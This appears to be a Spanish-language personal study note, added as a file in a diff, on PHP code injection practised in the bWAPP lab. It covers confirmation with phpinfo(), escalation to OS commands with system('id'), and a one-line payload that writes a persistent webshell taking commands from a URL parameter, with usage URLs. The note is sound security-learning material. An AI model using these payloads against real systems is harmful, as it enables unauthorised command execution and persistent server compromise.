@@ -1,0 +1,66 @@
+Code Injection
+Concepto
+
+Code Injection es la vulnerabilidad que surge cuando una aplicación permite ejecutar código arbitrario del lenguaje con el que está construida (PHP, Python, etc.) a partir de input del usuario no sanitizado — típicamente a través de una función de evaluación dinámica como eval() en PHP.
+
+Se diferencia de OS Command Injection en que el código inyectado se ejecuta dentro del intérprete del lenguaje de la aplicación, no directamente en el shell del sistema operativo. Sin embargo, un Code Injection puede escalar a OS Command Injection: si el código evaluado tiene acceso a funciones del lenguaje que a su vez invocan al sistema operativo (system(), exec(), shell_exec(), passthru() en PHP), el atacante pasa de ejecutar código del lenguaje a ejecutar comandos del SO.
+
+Cadena de escalada
+Code Injection (eval() del input del usuario)
+        ↓
+código PHP arbitrario ejecutándose en el servidor
+        ↓
+llamada a system() / exec() / shell_exec() dentro de ese código
+        ↓
+OS Command Injection (ejecución de comandos del SO)
+Confirmación de la vulnerabilidad
+
+Paso 1 — Prueba de concepto no destructiva:
+
+php
+phpinfo()
+
+Se inyecta en el campo vulnerable (reemplazando el valor legítimo). Si el servidor responde con la salida completa de la función phpinfo() (versión de PHP, configuración, módulos cargados, etc.), se confirma que el input se está evaluando como código PHP real, no mostrando como texto plano.
+
+Paso 2 — Escalada a ejecución de comandos del SO:
+
+php
+system('id')
+
+Resultado obtenido en el lab:
+
+uid=33(www-data) gid=33(www-data) grupos=33(www-data)
+
+Confirma ejecución de comandos del sistema operativo con el usuario de bajo privilegio con el que corre Apache (GID 33 = www-data en Debian/Ubuntu). Esto también indica que no hay privilegios de root — tema de escalada de privilegios, pendiente para una sesión futura.
+
+Escritura de un webshell persistente
+
+El salto más relevante de la sesión: en vez de reinyectar un payload completo cada vez que se quiere ejecutar un comando, se puede usar el Code Injection para escribir un archivo PHP persistente en el document root, que actúa como shell web reutilizable.
+
+php
+file_put_contents("shell.php", "<?php if(isset($_GET['cmd'])) { echo '<pre>'; system($_GET['cmd']); echo '</pre>'; } ?>");
+
+Qué hace cada parte:
+
+file_put_contents(): función PHP de escritura de archivos — demuestra que el Code Injection da acceso a todo el lenguaje, no solo a ejecución de comandos puntual.
+El contenido escrito es un mini-webshell: valida que exista el parámetro cmd en la URL, lo pasa a system(), y envuelve la salida en <pre> para que se vea legible en el navegador (saltos de línea y espacios se renderizan correctamente en HTML, a diferencia del problema de exfiltración por URL visto en OS Command Injection).
+Debe escaparse correctamente las comillas y URL-encodear el payload si se envía por GET/POST con caracteres especiales.
+El archivo debe caer dentro del document root (mismo principio que write-to-web) para ser accesible después.
+
+Uso posterior:
+
+http://<target>/bWAPP/shell.php?cmd=ls
+http://<target>/bWAPP/shell.php?cmd=whoami
+
+Ejecución de cualquier comando sin volver a tocar el endpoint vulnerable original — útil porque el campo original puede "arreglarse" o rotar (tokens, sesión) mientras el shell permanece.
+
+Qué memorizar vs. qué no
+
+No es necesario memorizar la sintaxis exacta (escapes, orden de URL-encoding, nombre preciso de cada función). Lo que hay que tener internalizado es el concepto:
+
+Se necesita una función de escritura de archivos (file_put_contents(), fwrite(), etc.)
+El contenido escrito debe ser PHP válido, delimitado por <?php ... ?>
+Ese PHP debe tomar un parámetro de la URL y pasarlo a una función de ejecución de comandos
+El archivo debe caer dentro del document root
+El formateo visual (<pre>, etc.) es solo presentación, no parte del concepto
+
